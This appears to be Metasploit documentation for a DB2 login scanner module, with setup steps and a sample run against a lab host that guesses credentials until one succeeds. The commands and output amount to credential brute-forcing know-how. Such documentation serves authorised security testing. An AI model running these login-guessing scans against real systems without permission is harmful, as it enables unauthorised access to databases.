## Vulnerable Application

This module attempts to authenticate against a DB2 instance using username and password combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options.

More information can be found on the [Rapid7 Vulnerability & Exploit Database page](https://www.rapid7.com/db/modules/auxiliary/scanner/db2/db2_auth) and https://nvd.nist.gov/vuln/detail/CVE-1999-0502

## Verification Steps

  1. Start msfconsole
  2. Do: `use auxiliary/scanner/db2/db2_auth`
  3. Do: `set RHOSTS [ip]`
  4. Do: `run`

## Scenarios

###  A run on Kali Linux 2019.3 and DB2 11.5.0.0a

    ```
    msf > use auxiliary/scanner/db2/db2_auth
    msf auxiliary/scanner/db2/db2_auth) > show options
    msf auxiliary/scanner/db2/db2_auth) > set USERNAME db2inst1
    msf auxiliary/scanner/db2/db2_auth) > set PASSWORD db2pass
    msf auxiliary(scanner/db2/db2_auth) > set DATABASE testdb
    msf auxiliary/scanner/db2/db2_auth) > set RHOST 172.17.0.2
    msf auxiliary/scanner/db2/db2_auth) > run
      [-] 172.17.0.2:50000      - 172.17.0.2:50000 - LOGIN FAILED: db2inst1:db2inst1@testdb (Incorrect: )
      [-] 172.17.0.2:50000      - 172.17.0.2:50000 - LOGIN FAILED: db2inst1:dasusr1@testdb (Incorrect: )
      [-] 172.17.0.2:50000      - 172.17.0.2:50000 - LOGIN FAILED: db2inst1:db2fenc1@testdb (Incorrect: )
      [*] 172.17.0.2:50000      - Login Successful: db2inst1:db2pass
      [*] 172.17.0.2:50000      - Scanned 1 of 1 hosts (100% complete)
      [*] Auxiliary module execution completed
    ```
